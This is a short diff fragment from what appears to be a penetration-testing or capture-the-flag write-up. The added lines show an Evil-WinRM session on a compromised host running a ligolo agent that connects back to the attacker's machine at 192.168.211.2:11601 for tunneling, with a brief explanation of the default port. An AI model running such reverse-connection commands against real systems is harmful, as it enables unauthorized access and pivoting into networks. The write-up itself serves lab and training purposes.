@@ -922,5 +922,11 @@ Info: Upload successful!
 Ill then upload the agent via winrm on the storage server
 
 ```python
+*Evil-WinRM* PS C:\Users\ryan.collins\Documents> ./agent.exe -connect 192.168.211.2:11601 --ignore-cert
+```
+
+Then ill execute the agent to connect back to me, port `11601` is the default listening port for ligolo
+
+```python
 
 ```
